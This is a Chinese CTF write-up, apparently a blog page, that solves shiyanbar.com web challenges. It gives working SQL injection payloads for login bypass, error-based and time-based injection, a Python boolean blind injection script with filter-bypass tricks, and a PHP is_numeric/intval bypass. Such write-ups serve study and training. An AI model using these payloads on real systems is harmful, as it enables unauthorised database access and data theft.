+<h3 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/baocuo/index.php</a></p>
+<p>源代码提示了需要post参数username和password</p>
+<p>还给出了sql语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$password'</span></span><br></pre></td></tr></table></figure>
+<p>使用万能密码登录admin用户,username=admin&amp;password=’ or ‘1</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>登录成功，但没有给出flag，说明要进行题目说的报错注入才能得到flag</p>
+<p>尝试在username参数进行报错注入，但发现过了括号，注释符#，–，%3B%00</p>
+<p>但是行注释符没有被过滤，我们可以通过行注释符注释掉中间的’ and password=’进行注入</p>
+<p>得出payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; /*&amp;password=*/ or &apos;</span><br></pre></td></tr></table></figure>
+<p>拼接后相当于执行sql语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin'</span> <span class="comment">/*and password='*/</span> <span class="keyword">or</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>
+<p>在本地数据库演示</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/7.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>那么使用在username中使用extract，在password中使用括号，再通过行注释符注释中间，最终拼接成完成的extractvalue注入，就是我们的目的</p>
+<p>先注出数据库</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select database()),0x3a)) or &apos;</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/8.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>注表名</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x3a)) or &apos;</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/9.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>猜测flag可能在表ffll44jj中</p>
+<p>注列名</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp &apos;ffll44jj&apos;),0x3a)) or &apos;</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/10.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>注数据</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj),0x3a)) or &apos;</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/11.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>获得flag</p>
+<h3 id="认真一点"><a href="#认真一点" class="headerlink" title="认真一点"></a>认真一点</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/earnest/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/earnest/index.php</a></p>
+<p>输入id=1，页面返回You are in…，输入id等于其他值都返回You are not in，输入id=1’，返回You are not in，输入id=1”，返回You are in，猜测id可能被单引号包裹</p>
+<p>那么我们可以根据返回信息的不同进行基于布尔的注入，但是经过测试，这题过滤了注释符，空格，逗号,substr，同时将or替换为空字符串，替换的解决方法是双写or绕过，过滤了空格可以用括号代替，substr用mid代替，过滤了逗号，可以用mid from  for</p>
+<p>给出脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/earnest/index.php"</span></span><br><span class="line">all_string = <span class="string">'''qwertyuiopasdfghjklzxcvbnm `~1234567890!@#$%^&amp;*()-_=+[&#123;]&#125;;:'"\|&lt;,&gt;.?/QWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line">table_name = <span class="string">""</span></span><br><span class="line">column_name = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名:ctf_sql_bool_blind</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"0'oorr(ascii(mid((database())from("</span>+str(i)+<span class="string">")foorr(1)))="</span>+str(ord(j))+<span class="string">")oorr'0"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in ................'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">"The "</span>+str(i)+<span class="string">" place of database is: "</span>+j)</span><br><span class="line">            database = database + j</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"database: "</span>+database)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据表名:fiag,users</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"0'oorr(ascii(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from("</span>+str(i)+<span class="string">")foorr(1)))="</span>+str(ord(j))+<span class="string">")oorr'0"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in ................'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">"The "</span>+str(i)+<span class="string">" place of table_name is: "</span>+j)</span><br><span class="line">            table_name = table_name + j</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"table_name: "</span>+table_name)</span><br><span class="line"><span class="comment">#获取fiag下列名:fL$4G</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"0'oorr(ascii(mid((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='fiag'))from("</span>+str(i)+<span class="string">")foorr(1)))="</span>+str(ord(j))+<span class="string">")oorr'0"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in ................'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">"The "</span>+str(i)+<span class="string">" place of column_name is: "</span>+j)</span><br><span class="line">            column_name = column_name + j</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"column_name: "</span>+column_name)</span><br><span class="line"><span class="comment">#获取数据:flag&#123;haha~you win!&#125;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"0'oorr(ascii(mid((select(fL$4G)from(fiag))from("</span>+str(i)+<span class="string">")foorr(1)))="</span>+str(ord(j))+<span class="string">")oorr'0"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in ................'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">"The "</span>+str(i)+<span class="string">" place of flag is: "</span>+j)</span><br><span class="line">            flag = flag + j</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"flag: "</span>+flag)</span><br></pre></td></tr></table></figure>
+<h3 id="你真的会PHP吗"><a href="#你真的会PHP吗" class="headerlink" title="你真的会PHP吗"></a>你真的会PHP吗</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/PHP/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/PHP/index.php</a></p>
+<p>抓包发现响应包头部存在提示字段：hint: 6c525af4059b4fe7d8c33a.txt</p>
+<p>访问得到源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = &quot;&quot;; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;xxxxxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&apos;number&apos;]))&#123;</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_POST] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = 0; </span><br><span class="line">    $j = strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $info;</span><br></pre></td></tr></table></figure>
+<p>审计，整理思路，列出主要代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>1.首先必须POST参数number，然后得到关键参数$_REQUEST[‘number’]和$req[‘number’]，$req[‘number’]是通过数组POST遍历获得</p>
+<p>2.$_REQUEST[‘number’]不能是一个数字字符串，且$req[‘number’]通过intval函数取整形值后再转换成字符串必须等于原本的$req[‘number’]</p>
+<p>3.$req[‘number’]通过intval函数取整形值必须等于$req[‘number’]通过strrev函数取回文字符串后再通过intval函数取整形值</p>
+<p>4.$req[‘number’]通过is_palindrome_number函数检测不能是一个回文数</p>
+<p>首先考虑思路的第二步，不能是数字字符串，但是却取整形值后要等于原来的值，看似不可能，但是我们可以通过%00截断is_numeric函数</p>
+<p>接下来考虑思路的第三步和第四步，前后检测是否为回文数明显矛盾，这里解决方法是利用intval函数的溢出</p>
+<p>参考别人的题解里的一句话：intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。<br>举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。</p>
+<p>64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p>
+<p>通过上面我们知道服务器的操作系统是32位的，所以我们构造2147483647就可以同时满足2，3条件</p>
+<p>所以赋值number=2147483647%00即可获得flag</p>
+<p>我们可以在本地环境测试一下，给出我本地测试的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = &quot;&quot;; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;flag&#123;xxxxxxxxxx&#125;&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&apos;number&apos;]))&#123;</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_GET] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = 0; </span><br><span class="line">    $j = strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">echo &quot;\$_REQUEST[&apos;number&apos;] = &quot;.$_REQUEST[&apos;number&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;\$req[&apos;number&apos;] = &quot;.$req[&apos;number&apos;].&apos;&lt;br&gt;&apos;; </span><br><span class="line">echo &quot;is_numeric(\$_REQUEST[&apos;number&apos;]) = &quot;.is_numeric($_REQUEST[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;intval(\$req[&apos;number&apos;]): &quot;.intval($req[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;\$value1 = intval(\$req[&apos;number&apos;]) = &quot;.intval($req[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;strrev(\$req[&apos;number&apos;]) = &quot;.strrev($req[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;\$value2 = intval(strrev(\$req[&apos;number&apos;])) = &quot;.intval(strrev($req[&quot;number&quot;])).&apos;&lt;br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;</span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $info;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>赋值number=2147483647%00</p>
+<p>执行结果如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/12.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>可以看到%00成功截断了函数is_numeric，而intval函数会忽略%00，所以strval的值等于原来的值，思路的第二步成功</p>
+<p>再看$req[‘number’]通过strrev函数处理的结果是7463847412，但是再经过intval函数处理结果依旧是原来的2147483647，这就是intval函数溢出，因为2147483647已经是最大值了，大于这个最大值的数经过intval函数处理都是2147483647，而2147483647经过is_palindrome_number函数处理一定返回false，因为它本来就不是回文数</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/13.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>最终获得的flag</p>
+<h3 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗??"></a>登陆一下好吗??</h3><p>不要怀疑，我已经过滤了一切,还再逼你注入，哈哈哈哈哈!</p>
+<p>flag格式：ctf{xxxx}</p>
+<p>解题链接：<a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a> </p>
+<p>考察SQL注入，猜测后台SQL如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$password'</span></span><br></pre></td></tr></table></figure>
+<p>尝试使用： <strong>‘=’</strong> ，SQL语句就变成：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">''</span>=<span class="string">''</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">''</span>=<span class="string">''</span></span><br></pre></td></tr></table></figure>
+<p>按照逻辑，从左往右： <strong>username=’’</strong>  然后 <strong>‘’=’’</strong> 为真，<strong>password</strong> 也一样，类似下面：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/36.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>所以我们账号和密码都填 <strong>‘=’</strong> ，即可获得flag。</p>
+<h3 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h3><p>我要把攻击我的人都记录db中去!</p>
+<p>解题链接：<a href="http://ctf5.shiyanbar.com/web/wonderkun/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/wonderkun/index.php</a> </p>
+<p>发现题目会记录用户的IP地址，并记录到数据库中，那么我们就想到使用 <strong>HTTP</strong> 数据包头部的 <strong>X-Forwarded-For</strong> 字段伪造IP，进行 <strong>SQL</strong> 注入。尝试使用 <strong>payload</strong> ： <strong>1’ and sleep(3) and ‘1</strong> ，发现成功执行。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/37.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
